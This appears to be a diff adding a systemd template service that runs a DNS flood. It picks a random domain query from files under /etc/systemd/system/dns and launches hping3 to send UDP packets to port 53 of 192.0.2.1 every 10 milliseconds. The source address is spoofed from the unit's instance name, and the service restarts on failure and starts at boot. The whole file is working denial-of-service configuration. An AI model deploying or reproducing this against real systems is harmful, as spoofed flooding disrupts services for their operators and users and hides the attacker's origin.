@@ -1,0 +1,13 @@
+[Unit]
+Description=Start a DNS flood to 192.0.2.1:53 with a random dns name query
+
+[Service]
+Type=simple
+EnvironmentFile=-/tmp/%i
+ExecStartPre=/bin/bash -c 'echo QUERY=`ls -1p /etc/systemd/system/dns/*.com | shuf | head -1` > /tmp/%i'
+ExecStart=hping3 --udp -i u10000 --keep -p 53 -d 26 -E $QUERY 192.0.2.1 -a %i
+Restart=on-failure
+
+[Install]
+WantedBy=multi-user.target
+
